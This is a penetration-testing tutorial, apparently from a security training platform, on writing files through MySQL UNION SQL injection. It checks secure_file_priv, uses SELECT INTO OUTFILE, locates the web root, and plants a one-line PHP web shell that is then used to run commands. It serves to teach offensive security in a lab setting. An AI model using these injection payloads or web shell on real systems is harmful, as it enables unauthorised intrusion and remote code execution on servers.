# Writing Files



***

### <mark style="color:red;">Write File Privileges</mark>

To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

We have already found that our current user has the `FILE` privilege necessary to write files. We must now check if the MySQL database has that privilege. This can be done by checking the `secure_file_priv` global variable.

<mark style="color:green;">**secure\_file\_priv**</mark>

The [secure\_file\_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, `NULL` means we cannot read/write from any directory. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the `FILE` privilege. However, `MySQL` uses `/var/lib/mysql-files` as the default folder. This means that reading files through a `MySQL` injection isn't possible with default settings. Even worse, some modern configurations default to `NULL`, meaning that we cannot read/write files anywhere within the system.

So, let's see how we can find out the value of `secure_file_priv`. Within `MySQL`, we can use the following query to obtain the value of this variable:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

However, as we are using a `UNION` injection, we have to get the value using a `SELECT` statement. This shouldn't be a problem, as all variables and most configurations' are stored within the `INFORMATION_SCHEMA` database. `MySQL` global variables are stored in a table called [global\_variables](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html), and as per the documentation, this table has two columns `variable_name` and `variable_value`.

We have to select these two columns from that table in the `INFORMATION_SCHEMA` database. There are hundreds of global variables in a MySQL configuration, and we don't want to retrieve all of them. We will then filter the results to only show the `secure_file_priv` variable, using the `WHERE` clause we learned about in a previous section.

The final SQL query is the following:

{% code overflow="wrap" fullWidth="true" %}
```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```
{% endcode %}

So, similar to other `UNION` injection queries, we can get the above query result with the following payload. Remember to add two more columns `1` & `4` as junk data to have a total of 4 columns':

{% code overflow="wrap" fullWidth="true" %}
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
{% endcode %}

<figure><img src="https://academy.hackthebox.com/storage/modules/33/secure_file_priv.jpg" alt=""><figcaption></figcaption></figure>

And the result shows that the `secure_file_priv` value is empty, meaning that we can read/write files to any location.

***

### <mark style="color:red;">SELECT INTO OUTFILE</mark>

```shell-session
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

If we go to the back-end server and `cat` the file, we see that table's content:

```shell-session
mrroboteLiot@htb[/htb]$ cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```

It is also possible to directly `SELECT` strings into files, allowing us to write arbitrary files to the back-end server.

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

When we `cat` the file, we see that text:

```shell-session
mrroboteLiot@htb[/htb]$ cat /tmp/test.txt 

this is a test
```

```shell-session
mrroboteLiot@htb[/htb]$ ls -la /tmp/test.txt 

-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
```

Tip: Advanced file exports utilize the 'FROM\_BASE64("base64\_data")' function in order to be able to write long/advanced files, including binary data.

***

### <mark style="color:red;">Writing Files through SQL Injection</mark>

```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

{% hint style="warning" %}
Note: To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.
{% endhint %}

The `UNION` injection payload would be as follows:

{% code fullWidth="true" %}
```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```
{% endcode %}

<figure><img src="https://academy.hackthebox.com/storage/modules/33/write_proof.png" alt=""><figcaption></figcaption></figure>

We don’t see any errors on the page, which indicates that the query succeeded. Checking for the file `proof.txt` in the webroot, we see that it indeed exists:

<figure><img src="https://academy.hackthebox.com/storage/modules/33/write_proof_text.png" alt=""><figcaption></figcaption></figure>

Note: We see the string we dumped along with '1', '3' before it, and '4' after it. This is because the entire 'UNION' query result was written to the file. To make the output cleaner, we can use "" instead of numbers.

***

### <mark style="color:red;">Writing a Web Shell</mark>

Having confirmed write permissions, we can go ahead and write a PHP web shell to the webroot folder. We can write the following PHP webshell to be able to execute commands directly on the back-end server:

```php
<?php system($_REQUEST[0]); ?>
```

We can reuse our previous `UNION` injection payload, and change the string to the above, and the file name to `shell.php`:

{% code fullWidth="true" %}
```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
{% endcode %}

&#x20;   ', “ “, “ “ into outfile '/var/www/html/shell.php'-- -'>

<figure><img src="https://academy.hackthebox.com/storage/modules/33/write_shell.png" alt=""><figcaption></figcaption></figure>

Once again, we don't see any errors, which means the file write probably worked. This can be verified by browsing to the `/shell.php` file and executing commands via the `0` parameter, with `?0=id` in our URL:

<figure><img src="https://academy.hackthebox.com/storage/modules/33/write_shell_exec_1.png" alt=""><figcaption></figcaption></figure>

The output of the `id` command confirms that we have code execution and are running as the `www-data` user.
